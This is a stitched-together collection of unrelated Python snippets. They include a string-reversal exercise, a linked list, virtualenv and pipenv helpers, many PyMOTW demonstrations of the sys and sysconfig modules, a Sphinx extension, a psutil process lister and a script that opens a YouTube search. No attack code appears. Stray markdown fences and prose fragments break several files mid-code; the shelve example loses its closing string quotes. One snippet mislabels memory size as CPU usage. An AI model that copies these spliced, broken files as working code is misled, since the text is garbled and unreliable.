Sample output: 'much like this program very i'

=========================================
Reverse the whole string, after that reverse only first and only last word,
in the end reverse everything between first and last word. (using IN-PLACE reversing)
In Python, the string manipulation operations are too slow (string is immutable), because of that we need to convert the string into array.
In C/C++, the Space complexity will be O(1) (because the strings are just arrays with chars).
    Time complexity:    O(N)    , O(N + N) = O(2 * N) = O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############


def swap_first_and_last_word(sentence):
    arr = [c for c in sentence]  # or just arr = list(sentence)
    first_idx = 0
    last_idx = len(arr) - 1

    # reverse the whole array, in this way I'll change the first and the last word
    reverse_array(arr, first_idx, last_idx)

    # find positions of the first and the last space char
    first_space = first_idx
    while arr[first_space] != " ":
        first_space += 1

    last_space = last_idx
    while arr[last_space] != " ":
        last_space -= 1

    # reverse only the first word
    reverse_array(arr, first_idx, first_space - 1)
    # reverse only the last word
    reverse_array(arr, last_space + 1, last_idx)
    # reverse everything between (with this reversing, all words between will have the same order as the starting one)
    reverse_array(arr, first_space + 1, last_space - 1)

    return "".join(arr)


def reverse_array(arr, start, end):
    # reverse the array from the start index to the end index
    while start < end:
        arr[start], arr[end] = arr[end], arr[start]  # swap
        start += 1
        end -= 1


###########
# Testing #
###########

# Test 1
# Correct result => 'practice makes perfect
print(swap_first_and_last_word("perfect makes practice"))

# Test 2
# Correct result => 'much like this program very i'
print(swap_first_and_last_word("i like this program very much"))

from typing import Any


class Node:
    def __init__(self, data: Any):
        self.data = data
        self.next = None


class LinkedList:
    def __init__(self):
        self.head = None

    def print_list(self):
        temp = self.head
        while temp is not None:
            print(temp.data, end=" ")
            temp = temp.next
        print()

    # adding nodes
    def push(self, new_data: Any):
        new_node = Node(new_data)
        new_node.next = self.head
        self.head = new_node

    # swapping nodes
    def swap_nodes(self, node_data_1, node_data_2):
        if node_data_1 == node_data_2:
            return
        else:
            node_1 = self.head
            while node_1 is not None and node_1.data != node_data_1:
                node_1 = node_1.next

            node_2 = self.head
            while node_2 is not None and node_2.data != node_data_2:
                node_2 = node_2.next

            if node_1 is None or node_2 is None:
                return

            node_1.data, node_2.data = node_2.data, node_1.data


if __name__ == "__main__":
    ll = LinkedList()
    for i in range(5, 0, -1):
        ll.push(i)

    ll.print_list()

    ll.swap_nodes(1, 4)
    print("After swapping")
    ll.print_list()

from __future__ import absolute_import, unicode_literals

import os
import subprocess
from stat import S_IREAD, S_IRGRP, S_IROTH

from virtualenv.util.path import safe_delete, set_tree
from virtualenv.util.six import ensure_text
from virtualenv.util.subprocess import Popen

from .base import PipInstall


class SymlinkPipInstall(PipInstall):
    def _sync(self, src, dst):
        src_str = ensure_text(str(src))
        dest_str = ensure_text(str(dst))
        os.symlink(src_str, dest_str)

    def _generate_new_files(self):
        # create the pyc files, as the build image will be R/O
        process = Popen(
            [ensure_text(str(self._creator.exe)), "-m", "compileall", ensure_text(str(self._image_dir))],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        process.communicate()
        # the root pyc is shared, so we'll not symlink that - but still add the pyc files to the RECORD for close
        root_py_cache = self._image_dir / "__pycache__"
        new_files = set()
        if root_py_cache.exists():
            new_files.update(root_py_cache.iterdir())
            new_files.add(root_py_cache)
            safe_delete(root_py_cache)
        core_new_files = super(SymlinkPipInstall, self)._generate_new_files()
        # remove files that are within the image folder deeper than one level (as these will be not linked directly)
        for file in core_new_files:
            try:
                rel = file.relative_to(self._image_dir)
                if len(rel.parts) > 1:
                    continue
            except ValueError:
                pass
            new_files.add(file)
        return new_files

    def _fix_records(self, new_files):
        new_files.update(i for i in self._image_dir.iterdir())
        extra_record_data_str = self._records_text(sorted(new_files, key=str))
        with open(ensure_text(str(self._dist_info / "RECORD")), "wb") as file_handler:
            file_handler.write(extra_record_data_str.encode("utf-8"))

    def build_image(self):
        super(SymlinkPipInstall, self).build_image()
        # protect the image by making it read only
        set_tree(self._image_dir, S_IREAD | S_IRGRP | S_IROTH)

    def clear(self):
        if self._image_dir.exists():
            safe_delete(self._image_dir)
        super(SymlinkPipInstall, self).clear()

# -*- coding=utf-8 -*-

from __future__ import absolute_import, print_function, unicode_literals


def sync(project=None, dev=False, clean=True):
    from passa.models.synchronizers import Synchronizer
    from passa.operations.sync import sync

    project = project
    syncer = Synchronizer(
        project, default=True, develop=dev,
        clean_unneeded=clean,
    )

    success = sync(syncer)
    if not success:
        return 1

    print("Synchronized project at", project.root)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys
import textwrap

name_text = ', '.join(sorted(sys.builtin_module_names))

print(textwrap.fill(name_text, width=64))

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys
import threading
import time

io_lock = threading.Lock()
blocker = threading.Lock()


def block(i):
    t = threading.current_thread()
    with io_lock:
        print('{} with ident {} going to sleep'.format(
            t.name, t.ident))
    if i:
        blocker.acquire()  # acquired but never released
        time.sleep(0.2)
    with io_lock:
        print(t.name, 'finishing')
    return


# Create and start several threads that "block"
threads = [
    threading.Thread(target=block, args=(i,))
    for i in range(3)
]
for t in threads:
    t.setDaemon(True)
    t.start()

# Map the threads from their identifier to the thread object
threads_by_ident = dict((t.ident, t) for t in threads)

# Show where each thread is "blocked"
time.sleep(0.01)
with io_lock:
    for ident, frame in sys._current_frames().items():
        t = threads_by_ident.get(ident)
        if not t:
            # Main thread
            continue
        print('{} stopped in {} at line {} of {}'.format(
            t.name, frame.f_code.co_name,
            frame.f_lineno, frame.f_code.co_filename))

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys


class ExpressionCounter:

    def __init__(self):
        self.count = 0
        self.previous_value = self

    def __call__(self, value):
        print()
        print('  Previous:', self.previous_value)
        print('  New     :', value)
        print()
        if value != self.previous_value:
            self.count += 1
            sys.ps1 = '({:3d})> '.format(self.count)
        self.previous_value = value
        sys.__displayhook__(value)


print('installing')
sys.displayhook = ExpressionCounter()

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys
import threading
import time


def do_something_with_exception():
    exc_type, exc_value = sys.exc_info()[:2]
    print('Handling {} exception with message "{}" in {}'.format(
        exc_type.__name__, exc_value,
        threading.current_thread().name))


def cause_exception(delay):
    time.sleep(delay)
    raise RuntimeError('This is the error message')


def thread_target(delay):
    try:
        cause_exception(delay)
    except RuntimeError:
        do_something_with_exception()


threads = [
    threading.Thread(target=thread_target, args=(0.3,)),
    threading.Thread(target=thread_target, args=(0.1,)),
]

for t in threads:
    t.start()
for t in threads:
    t.join()

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys


def my_excepthook(type, value, traceback):
    print('Unhandled error:', type, value)


sys.excepthook = my_excepthook

print('Before exception')

raise RuntimeError('This is the error message')

print('After exception')

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

exit_code = int(sys.argv[1])
sys.exit(exit_code)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

if sys.flags.bytes_warning:
    print('Warning on bytes/str errors')
if sys.flags.debug:
    print('Debuging')
if sys.flags.inspect:
    print('Will enter interactive mode after running')
if sys.flags.optimize:
    print('Optimizing byte-code')
if sys.flags.dont_write_bytecode:
    print('Not writing byte-code files')
if sys.flags.no_site:
    print('Not importing "site"')
if sys.flags.ignore_environment:
    print('Ignoring environment')
if sys.flags.verbose:
    print('Verbose mode')

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

print('Smallest difference (epsilon):', sys.float_info.epsilon)
print()
print('Digits (dig)              :', sys.float_info.dig)
print('Mantissa digits (mant_dig):', sys.float_info.mant_dig)
print()
print('Maximum (max):', sys.float_info.max)
print('Minimum (min):', sys.float_info.min)
print()
print('Radix of exponents (radix):', sys.float_info.radix)
print()
print('Maximum exponent for radix (max_exp):',
      sys.float_info.max_exp)
print('Minimum exponent for radix (min_exp):',
      sys.float_info.min_exp)
print()
print('Max. exponent power of 10 (max_10_exp):',
      sys.float_info.max_10_exp)
print('Min. exponent power of 10 (min_10_exp):',
      sys.float_info.min_10_exp)
print()
print('Rounding for addition (rounds):', sys.float_info.rounds)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

one = []
print('At start         :', sys.getrefcount(one))

two = one

print('Second reference :', sys.getrefcount(one))

del two

print('After del        :', sys.getrefcount(one))

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys


class MyClass:
    pass


objects = [
    [], (), {}, 'c', 'string', b'bytes', 1, 2.3,
    MyClass, MyClass(),
]

for obj in objects:
    print('{:>10} : {}'.format(type(obj).__name__,
                               sys.getsizeof(obj)))

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys


class WithAttributes:
    def __init__(self):
        self.a = 'a'
        self.b = 'b'
        return

    def __sizeof__(self):
        return object.__sizeof__(self) + \
            sum(sys.getsizeof(v) for v in self.__dict__.values())


my_inst = WithAttributes()
print(sys.getsizeof(my_inst))

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys


class WithoutAttributes:
    pass


class WithAttributes:
    def __init__(self):
        self.a = 'a'
        self.b = 'b'
        return


without_attrs = WithoutAttributes()
print('WithoutAttributes:', sys.getsizeof(without_attrs))

with_attrs = WithAttributes()
print('WithAttributes:', sys.getsizeof(with_attrs))

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys


print('Name:', sys.implementation.name)
print('Version:', sys.implementation.version)
print('Cache tag:', sys.implementation.cache_tag)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

print('Number of bits used to hold each digit:',
      sys.int_info.bits_per_digit)
print('Size in bytes of C type used to hold each digit:',
      sys.int_info.sizeof_digit)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

print('Interpreter executable:')
print(sys.executable)
print('\nInstallation prefix:')
print(sys.prefix)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

print('maxsize   :', sys.maxsize)
print('maxunicode:', sys.maxunicode)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys
import types


class NoisyMetaImportFinder:

    def __init__(self, prefix):
        print('Creating NoisyMetaImportFinder for {}'.format(
            prefix))
        self.prefix = prefix
        return

    def find_module(self, fullname, path=None):
        print('looking for {!r} with path {!r}'.format(
            fullname, path))
        name_parts = fullname.split('.')
        if name_parts and name_parts[0] == self.prefix:
            print(' ... found prefix, returning loader')
            return NoisyMetaImportLoader(path)
        else:
            print(' ... not the right prefix, cannot load')
        return None


class NoisyMetaImportLoader:

    def __init__(self, path_entry):
        self.path_entry = path_entry
        return

    def load_module(self, fullname):
        print('loading {}'.format(fullname))
        if fullname in sys.modules:
            mod = sys.modules[fullname]
        else:
            mod = sys.modules.setdefault(
                fullname,
                types.ModuleType(fullname))

        # Set a few properties required by PEP 302
        mod.__file__ = fullname
        mod.__name__ = fullname
        # always looks like a package
        mod.__path__ = ['path-entry-goes-here']
        mod.__loader__ = self
        mod.__package__ = '.'.join(fullname.split('.')[:-1])

        return mod


# Install the meta-path finder
sys.meta_path.append(NoisyMetaImportFinder('foo'))

# Import some modules that are "found" by the meta-path finder
print()
import foo

print()
import foo.bar

# Import a module that is not found
print()
try:
    import bar
except ImportError as e:
    pass

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys
import textwrap

names = sorted(sys.modules.keys())
name_text = ', '.join(names)

print(textwrap.fill(name_text, width=64))

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys


class NoisyImportFinder:

    PATH_TRIGGER = 'NoisyImportFinder_PATH_TRIGGER'

    def __init__(self, path_entry):
        print('Checking {}:'.format(path_entry), end=' ')
        if path_entry != self.PATH_TRIGGER:
            print('wrong finder')
            raise ImportError()
        else:
            print('works')
        return

    def find_module(self, fullname, path=None):
        print('Looking for {!r}'.format(fullname))
        return None


sys.path_hooks.append(NoisyImportFinder)

for hook in sys.path_hooks:
    print('Path hook: {}'.format(hook))

sys.path.insert(0, NoisyImportFinder.PATH_TRIGGER)

try:
    print('importing target_module')
    import target_module
except Exception as e:
    print('Import failed:', e)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import os
import sys

prefix = os.path.abspath(sys.prefix)

print('PATH:')
for name in sys.path:
    name = name.replace(prefix, '...')
    print(' ', name)

print()
print('IMPORTERS:')
for name, cache_value in sys.path_importer_cache.items():
    if '..' in name:
        name = os.path.abspath(name)
    name = name.replace(prefix, '...')
    print('  {}: {!r}'.format(name, cache_value))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py

#end_pymotw_header
import importlib
import os
import sys

base_dir = os.path.dirname(__file__) or '.'
print('Base directory:', base_dir)

# Insert the package_dir_a directory at the front of the path.
package_dir_a = os.path.join(base_dir, 'package_dir_a')
sys.path.insert(0, package_dir_a)

# Import the example module
import example
print('Imported example from:', example.__file__)
print('  ', example.DATA)

# Make package_dir_b the first directory in the search path
package_dir_b = os.path.join(base_dir, 'package_dir_b')
sys.path.insert(0, package_dir_b)

# Reload the module to get the other version
importlib.reload(example)
print('Reloaded example from:', example.__file__)
print('  ', example.DATA)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

print('This interpreter was built for:', sys.platform)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys


class LineCounter:

    def __init__(self):
        self.count = 0

    def __str__(self):
        self.count += 1
        return '({:3d})> '.format(self.count)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

print('Initial limit:', sys.getrecursionlimit())

sys.setrecursionlimit(10)

print('Modified limit:', sys.getrecursionlimit())


def generate_recursion_error(i):
    print('generate_recursion_error({})'.format(i))
    generate_recursion_error(i + 1)


try:
    generate_recursion_error(1)
except RuntimeError as err:
    print('Caught exception:', err)

#!/usr/bin/env python3
# encoding: utf-8

import sys


def trace_calls(frame, event, arg):
    if event != 'call':
        return
    co = frame.f_code
    func_name = co.co_name
    if func_name == 'write':
        # Ignore write() calls from printing
        return
    func_line_no = frame.f_lineno
    func_filename = co.co_filename
    if not func_filename.endswith('sys_settrace_call.py'):
        # Ignore calls not in this module
        return
    caller = frame.f_back
    caller_line_no = caller.f_lineno
    caller_filename = caller.f_code.co_filename
    print('* Call to', func_name)
    print('*  on line {} of {}'.format(
        func_line_no, func_filename))
    print('*  from line {} of {}'.format(
        caller_line_no, caller_filename))
    return


def b():
    print('inside b()\n')


def a():
    print('inside a()\n')
    b()


sys.settrace(trace_calls)
a()

#!/usr/bin/env python3
# encoding: utf-8

import sys


def trace_exceptions(frame, event, arg):
    if event != 'exception':
        return
    co = frame.f_code
    func_name = co.co_name
    line_no = frame.f_lineno
    exc_type, exc_value, exc_traceback = arg
    print(('* Tracing exception:\n'
           '* {} "{}"\n'
           '* on line {} of {}\n').format(
               exc_type.__name__, exc_value, line_no,
               func_name))


def trace_calls(frame, event, arg):
    if event != 'call':
        return
    co = frame.f_code
    func_name = co.co_name
    if func_name in TRACE_INTO:
        return trace_exceptions


def c():
    raise RuntimeError('generating exception in c()')


def b():
    c()
    print('Leaving b()')


def a():
    b()
    print('Leaving a()')


TRACE_INTO = ['a', 'b', 'c']

sys.settrace(trace_calls)
try:
    a()
except Exception as e:
    print('Exception handler:', e)

#!/usr/bin/env python3
# encoding: utf-8

import functools
import sys


def trace_lines(frame, event, arg):
    if event != 'line':
        return
    co = frame.f_code
    func_name = co.co_name
    line_no = frame.f_lineno
    print('*  {} line {}'.format(func_name, line_no))


def trace_calls(frame, event, arg, to_be_traced):
    if event != 'call':
        return
    co = frame.f_code
    func_name = co.co_name
    if func_name == 'write':
        # Ignore write() calls from printing
        return
    line_no = frame.f_lineno
    filename = co.co_filename
    if not filename.endswith('sys_settrace_line.py'):
        # Ignore calls not in this module
        return
    print('* Call to {} on line {} of {}'.format(
        func_name, line_no, filename))
    if func_name in to_be_traced:
        # Trace into this function
        return trace_lines
    return


def c(input):
    print('input =', input)
    print('Leaving c()')


def b(arg):
    val = arg * 5
    c(val)
    print('Leaving b()')


def a():
    b(2)
    print('Leaving a()')


tracer = functools.partial(trace_calls, to_be_traced=['b'])
sys.settrace(tracer)
a()

#!/usr/bin/env python3
# encoding: utf-8

import sys


def trace_calls_and_returns(frame, event, arg):
    co = frame.f_code
    func_name = co.co_name
    if func_name == 'write':
        # Ignore write() calls from printing
        return
    line_no = frame.f_lineno
    filename = co.co_filename
    if not filename.endswith('sys_settrace_return.py'):
        # Ignore calls not in this module
        return
    if event == 'call':
        print('* Call to {} on line {} of {}'.format(
            func_name, line_no, filename))
        return trace_calls_and_returns
    elif event == 'return':
        print('* {} => {}'.format(func_name, arg))
    return


def b():
    print('inside b()')
    return 'response_from_b '


def a():
    print('inside a()')
    val = b()
    return val * 2


sys.settrace(trace_calls_and_returns)
a()

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import shelve
import os

filename = '/tmp/pymotw_import_example.shelve'
if os.path.exists(filename + '.db'):
    os.unlink(filename + '.db')
with shelve.open(filename) as db:
    db['data:README'] = b"""
==============
package README
==============

This is the README for ``package``.```


```py
    db['package.__init__'] = b"""
print('package imported')
message = 'This message is in package.__init__'```


```py
    db['package.module1'] = b"""
print('package.module1 imported')
message = 'This message is in package.module1'```


```py
    db['package.subpackage.__init__'] = b"""
print('package.subpackage imported')
message = 'This message is in package.subpackage.__init__'```


```py
    db['package.subpackage.module2'] = b"""
print('package.subpackage.module2 imported')
message = 'This message is in package.subpackage.module2'```


```py
    db['package.with_error'] = b"""
print('package.with_error being imported')
raise ValueError('raising exception to break import')```


```py
    print('Created {} with:'.format(filename))
    for key in sorted(db.keys()):
        print('  ', key)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys
import sys_shelve_importer
import os
import pkgutil

filename = '/tmp/pymotw_import_example.shelve'
sys.path_hooks.append(sys_shelve_importer.ShelveFinder)
sys.path.insert(0, filename)

import package

readme_path = os.path.join(package.__path__[0], 'README')

readme = pkgutil.get_data('package', 'README')
# Equivalent to:
#  readme = package.__loader__.get_data(readme_path)
print(readme.decode('utf-8'))

foo_path = os.path.join(package.__path__[0], 'foo')
try:
    foo = pkgutil.get_data('package', 'foo')
    # Equivalent to:
    #  foo = package.__loader__.get_data(foo_path)
except IOError as err:
    print('ERROR: Could not load "foo"', err)
else:
    print(foo)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys
import sys_shelve_importer

filename = '/tmp/pymotw_import_example.shelve'
sys.path_hooks.append(sys_shelve_importer.ShelveFinder)
sys.path.insert(0, filename)

try:
    import package.module3
except ImportError as e:
    print('Failed to import:', e)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys
import sys_shelve_importer


def show_module_details(module):
    print('  message    :', module.message)
    print('  __name__   :', module.__name__)
    print('  __package__:', module.__package__)
    print('  __file__   :', module.__file__)
    print('  __path__   :', module.__path__)
    print('  __loader__ :', module.__loader__)


filename = '/tmp/pymotw_import_example.shelve'
sys.path_hooks.append(sys_shelve_importer.ShelveFinder)
sys.path.insert(0, filename)

print('Import of "package.module1":')
import package.module1

print()
print('Examine package.module1 details:')
show_module_details(package.module1)

print()
print('Import of "package.subpackage.module2":')
import package.subpackage.module2

print()
print('Examine package.subpackage.module2 details:')
show_module_details(package.subpackage.module2)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys
import sys_shelve_importer


def show_module_details(module):
    print('  message    :', module.message)
    print('  __name__   :', module.__name__)
    print('  __package__:', module.__package__)
    print('  __file__   :', module.__file__)
    print('  __path__   :', module.__path__)
    print('  __loader__ :', module.__loader__)


filename = '/tmp/pymotw_import_example.shelve'
sys.path_hooks.append(sys_shelve_importer.ShelveFinder)
sys.path.insert(0, filename)

print('Import of "package":')
import package

print()
print('Examine package details:')
show_module_details(package)

print()
print('Global settings:')
print('sys.modules entry:')
print(sys.modules['package'])

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import importlib
import sys
import sys_shelve_importer

filename = '/tmp/pymotw_import_example.shelve'
sys.path_hooks.append(sys_shelve_importer.ShelveFinder)
sys.path.insert(0, filename)

print('First import of "package":')
import package

print()
print('Reloading "package":')
importlib.reload(package)

#!/usr/bin/env python3

#end_pymotw_header
import sys

print('STATUS: Reading from stdin', file=sys.stderr)

data = sys.stdin.read()

print('STATUS: Writing data to stdout', file=sys.stderr)

sys.stdout.write(data)
sys.stdout.flush()

print('STATUS: Done', file=sys.stderr)

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys
import threading
from queue import Queue


def show_thread(q):
    for i in range(5):
        for j in range(1000000):
            pass
        q.put(threading.current_thread().name)
    return


def run_threads():
    interval = sys.getswitchinterval()
    print('interval = {:0.3f}'.format(interval))
    q = Queue()
    threads = [
        threading.Thread(target=show_thread,
                         name='T{}'.format(i),
                         args=(q,))
        for i in range(3)
    ]
    for t in threads:
        t.setDaemon(True)
        t.start()
    for t in threads:
        t.join()
    while not q.empty():
        print(q.get(), end=' ')
    print()
    return


for interval in [0.001, 0.1]:
    sys.setswitchinterval(interval)
    run_threads()
    print()

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

print('Default encoding     :', sys.getdefaultencoding())
print('File system encoding :', sys.getfilesystemencoding())

#!/usr/bin/env python3
# encoding: utf-8
#end_pymotw_header
import sys

print('Version info:')
print()
print('sys.version      =', repr(sys.version))
print('sys.version_info =', sys.version_info)
print('sys.hexversion   =', hex(sys.hexversion))
print('sys.api_version  =', sys.api_version)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyAll configuration variables.```


```py

#end_pymotw_header
import sysconfig

print('User base directory:',
      sysconfig.get_config_var('userbase'))
print('Unknown variable   :',
      sysconfig.get_config_var('NoSuchVariable'))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyAll configuration variables.```


```py

#end_pymotw_header
import sysconfig

config_values = sysconfig.get_config_vars()
print('Found {} configuration settings'.format(
    len(config_values.keys())))

print('\nSome highlights:\n')

print(' Installation prefixes:')
print('  prefix={prefix}'.format(**config_values))
print('  exec_prefix={exec_prefix}'.format(**config_values))

print('\n Version info:')
print('  py_version={py_version}'.format(**config_values))
print('  py_version_short={py_version_short}'.format(
    **config_values))
print('  py_version_nodot={py_version_nodot}'.format(
    **config_values))

print('\n Base directories:')
print('  base={base}'.format(**config_values))
print('  platbase={platbase}'.format(**config_values))
print('  userbase={userbase}'.format(**config_values))
print('  srcdir={srcdir}'.format(**config_values))

print('\n Compiler and linker flags:')
print('  LDFLAGS={LDFLAGS}'.format(**config_values))
print('  BASECFLAGS={BASECFLAGS}'.format(**config_values))
print('  Py_ENABLE_SHARED={Py_ENABLE_SHARED}'.format(
    **config_values))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyAll configuration variables.```


```py

#end_pymotw_header
import sysconfig

bases = sysconfig.get_config_vars('base', 'platbase', 'userbase')
print('Base directories:')
for b in bases:
    print('  ', b)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyThe paths for a scheme.```


```py

#end_pymotw_header
import sysconfig
import pprint

for scheme in ['posix_prefix', 'posix_user']:
    print(scheme)
    print('=' * len(scheme))
    print('purelib =', sysconfig.get_path(name='purelib',
                                          scheme=scheme))
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyThe names of the paths in a scheme.```


```py

#end_pymotw_header
import sysconfig

for name in sysconfig.get_path_names():
    print(name)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyThe paths for a scheme.```


```py

#end_pymotw_header
import sysconfig
import pprint
import os

for scheme in ['posix_prefix', 'posix_user']:
    print(scheme)
    print('=' * len(scheme))
    paths = sysconfig.get_paths(scheme=scheme)
    prefix = os.path.commonprefix(list(paths.values()))
    print('prefix = {}\n'.format(prefix))
    for name, path in sorted(paths.items()):
        print('{}\n  .{}'.format(name, path[len(prefix):]))
    print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyPlatform specifier for binary modules```


```py

#end_pymotw_header
import sysconfig

print(sysconfig.get_platform())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyThe Python interpreter version```


```py

#end_pymotw_header
import sysconfig
import sys

print('sysconfig.get_python_version():',
      sysconfig.get_python_version())
print('\nsys.version_info:')
print('  major       :', sys.version_info.major)
print('  minor       :', sys.version_info.minor)
print('  micro       :', sys.version_info.micro)
print('  releaselevel:', sys.version_info.releaselevel)
print('  serial      :', sys.version_info.serial)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyInstallation schemes.```


```py

#end_pymotw_header
import sysconfig

for name in sysconfig.get_scheme_names():
    print(name)

from prompt_toolkit.completion.filesystem import ExecutableCompleter, PathCompleter
from prompt_toolkit.contrib.regular_languages.compiler import compile
from prompt_toolkit.contrib.regular_languages.completion import GrammarCompleter

__all__ = [
    "SystemCompleter",
]


class SystemCompleter(GrammarCompleter):
    """
    Completer for system commands.
    """

    def __init__(self) -> None:
        # Compile grammar.
        g = compile(
            r"""
                # First we have an executable.
                (?P<executable>[^\s]+)

                # Ignore literals in between.
                (
                    \s+
                    ("[^"]*" | '[^']*' | [^'"]+ )
                )*

                \s+

                # Filename as parameters.
                (
                    (?P<filename>[^\s]+) |
                    "(?P<double_quoted_filename>[^\s]+)" |
                    '(?P<single_quoted_filename>[^\s]+)'
                )
            """,
            escape_funcs={
                "double_quoted_filename": (lambda string: string.replace('"', '\\"')),
                "single_quoted_filename": (lambda string: string.replace("'", "\\'")),
            },
            unescape_funcs={
                "double_quoted_filename": (
                    lambda string: string.replace('\\"', '"')
                ),  # XXX: not entirely correct.
                "single_quoted_filename": (lambda string: string.replace("\\'", "'")),
            },
        )

        # Create GrammarCompleter
        super().__init__(
            g,
            {
                "executable": ExecutableCompleter(),
                "filename": PathCompleter(only_directories=False, expanduser=True),
                "double_quoted_filename": PathCompleter(
                    only_directories=False, expanduser=True
                ),
                "single_quoted_filename": PathCompleter(
                    only_directories=False, expanduser=True
                ),
            },
        )

import platform
import os
import sys

print("============================")
print("System Information : ")
print(os.name)
print(platform.system())
print(platform.release(), "\n")
print("============================")
print("Python Version Installed : ")
print(sys.version, "\n")
print("============================")

import psutil
import json


def getListOfProcessSortedByMemory():
    listOfProcObjects = []

    for proc in psutil.process_iter():
        pinfo = proc.as_dict(attrs=["pid", "name"])
        pinfo["CPU_USAGE"] = proc.memory_info().vms / (1024 * 1024)
        # Append dict to list
        listOfProcObjects.append(pinfo)

    listOfProcObjects = sorted(
        listOfProcObjects, key=lambda procObj: procObj["CPU_USAGE"], reverse=True
    )
    result = json.dumps(listOfProcObjects)
    lis = result.split("}")
    lst = [e[3:] for e in lis]
    start_text = """
    <html>
        <body>"""
    end_text = """
        </body>
    </html>
    """
    f = open("dump.html", "w+")
    f.write(start_text)
    for elem in lst:
        print(elem + str(" MB"))
        f.write("<p>" + str(elem) + " MB" + "</p>")
    f.write(end_text)
    f.close()


def main():

    print("##### Create a list of all running processes #######")
    getListOfProcessSortedByMemory()


if __name__ == "__main__":
    main()

# Tables maker
num = int(input("Number to make table : "))
li_a = [num for num in range(0, num * 11, num)]

for digit in li_a:
    print(digit)

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.
#
#
#                         All Rights Reserved
#

#

#```


```pyExtension to allow references to tables.

Use the ``:table:`` role in-line, specifying the title of the
table as set in the ``.. table`` directive.

For example::

    The CPython interpreter accepts several command line options
    to control its behavior, listed in :table:`CPython Command
    Line Option Flags`.

    .. table:: CPython Command Line Option Flags

        ========    =======
        Option      Meaning
        ========    =======
        -B          do not write .py[co] files on import
        -d          debug output from parser
        -E          ignore PYTHON* environment variables
        -i          inspect interactively after running script
        -O          optimize generated bytecode slightly
        -OO         remove doc-strings
        -s          do not add user site directory to sys.path
        -S          do not run 'import site' on initialization
        -t          issue warnings about inconsistent tab usage
        -tt         issue errors for inconsistent tab usage
        -v          verbose
        -3          warn about Python 3.x incompatibilities
        ========    =======
````

````py

import functools

from docutils import nodes, utils

from sphinx.util import logging

LOG = logging.getLogger(__name__)


class tableref(nodes.reference):
    pass


def _role(typ, rawtext, text, lineno, inliner,
          options={}, content=[], nodeclass=None):
    text = utils.unescape(text)
    pnode = nodeclass(
        rawsource=text,
        text='',
        internal=True,
        refuri=text,
    )
    return [pnode], []


def latex_visit_tableref(self, node):
    if node['ids']:
        id = node['ids'][0]
    else:
        id = 'table:' + node['refuri']
    self.body.append(r'Table~\ref{%s}' % self.idescape(id))
    raise nodes.SkipNode


def latex_depart_tableref(self, node):
    return


def html_visit_tableref(self, node):
    self.body.append('the table below')
    raise nodes.SkipNode


def html_depart_tableref(self, node):
    return


def builder_inited(app):
    LOG.info('defining table role')
    app.add_role(
        'table',
        functools.partial(_role, nodeclass=tableref)
    )


def setup(app):
    LOG.info('initializing tableref')
    app.add_node(
        tableref,
        latex=(latex_visit_tableref, None),
        html=(html_visit_tableref, html_depart_tableref),
    )
    app.connect('builder-inited', builder_inited)

# Multiplication Table viewer

while True:
    startOrEnd = str(input("Start or End : "))
    if startOrEnd == "Start":
        whichTable = int(input("Which Table : "))
        for x in range(1, 13):
            table = whichTable * x
            print(table)
        continue
    else:
        print("Program Ended...")
        break

# Copyright (c) 2009 Doug Hellmann.  All rights reserved.
#```


```pyUsing tabnanny from your own code```


```py

#end_pymotw_header
import sys
import tabnanny

# Turn on verbose mode
tabnanny.verbose = 1

for dirname in sys.argv[1:]:
    tabnanny.check(dirname)

import webbrowser
import time


make_use = 1

while make_use < 3:
    time.sleep(10)
    webbrowser.open("https://www.youtube.com/results?search_query=comedy+pranks")
    make_use = make_use + 1

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.
import os
import io
import tarfile
import nbformat

